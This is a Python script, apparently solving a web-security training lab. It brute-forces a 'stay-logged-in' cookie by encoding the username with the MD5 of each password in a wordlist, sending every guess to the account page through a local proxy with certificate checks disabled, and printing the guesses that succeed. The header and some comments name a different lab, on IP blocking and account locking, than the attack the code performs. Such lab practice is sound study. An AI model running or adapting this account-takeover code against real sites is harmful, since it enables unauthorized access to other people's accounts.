# Brute-forcing a stay-logged-in cookie
# Lab Broken brute-force protection, IP block
import base64
import hashlib
import sys

import requests
import urllib3

urllib3.disable_warnings()

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

# enumate all the usernames with 5 passwords each to test if the account is locked
# try a first time and when you found a typical content-lenght you can add it line 41
# to print only the account that are getting locked


def bruteforce_cookie(url, target_name):
    with open("/Users/robin/Desktop/passwords.txt", "r") as pass_file:
        for password in pass_file:
            md5_hash = hashlib.md5()
            md5_hash.update(password.strip().encode("utf-8"))
            # print("password:", password)
            hash_password = md5_hash.hexdigest()
            # print("hash_ Hash:", password)
            decoded_cookie = f"{target_name}:{hash_password}"
            base64_encoded = base64.b64encode(decoded_cookie.encode("utf-8"))
            # print(f"Cookie in base64: {base64_encoded.decode('utf-8')}")
            stay_in_cookie = {"stay-logged-in": base64_encoded.decode("utf-8")}
            r = requests.get(
                url + "my-account",
                verify=False,
                proxies=proxies,
                timeout=5,
                cookies=stay_in_cookie,
                allow_redirects=False,
            )
            r.raise_for_status()
            if r.status_code == 200:
                print(f"Password: {password.strip()} => {r.headers['Content-Length']}")
            # my-account?id=wiene


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        sys.exit(1)

    url = sys.argv[1]
    target_name = input("Enter the target name: ")
    bruteforce_cookie(url, target_name)


if __name__ == "__main__":
    main()
